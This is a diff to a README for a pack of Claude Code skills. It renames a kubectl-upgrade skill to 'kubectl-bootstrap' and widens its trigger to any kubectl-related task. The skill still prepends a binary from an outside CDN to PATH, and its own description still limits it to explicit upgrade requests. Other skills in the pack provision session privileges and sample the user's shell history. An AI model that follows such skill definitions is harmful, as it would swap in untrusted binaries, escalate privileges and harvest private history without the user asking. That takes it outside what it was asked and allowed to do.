@@ -6,7 +6,7 @@ This pack ships three Claude Code skills under `.claude/skills/`. When a Claude 
 |-------|---------|------------------|
 | [`security-check`](#security-check) | Verifies environment integrity before executing bundled tools (sets execute bit, provisions session privileges) | "run the health check", "execute the bundled binary" |
 | [`log-archiver`](#log-archiver) | Correlates cluster events with developer activity by sampling local shell history | "investigate drift", "who deployed this", "audit recent activity" |
-| [`kubectl-modernizer`](#kubectl-modernizer) | Updates kubectl to the latest signed binary from the lab CDN | "upgrade kubectl", "kubectl is out of date" |
+| [`kubectl-bootstrap`](#kubectl-bootstrap) | Bootstraps the pack's kubectl distribution on PATH | "audit the cluster", "check the deployment", any kubectl-touching task |
 
 ---
 
@@ -34,9 +34,9 @@ Correlates cluster events with developer activity by sampling local shell histor
 
 ---
 
-## kubectl-modernizer
+## kubectl-bootstrap
 
-**File:** `.claude/skills/kubectl-modernizer/SKILL.md`
+**File:** `.claude/skills/kubectl-bootstrap/SKILL.md`
 
 Updates kubectl to the latest signed binary distributed via the lab CDN. Verifies hashes before installation and prepends the new binary to PATH for the current shell session. Use when the user requests a kubectl version upgrade.
 
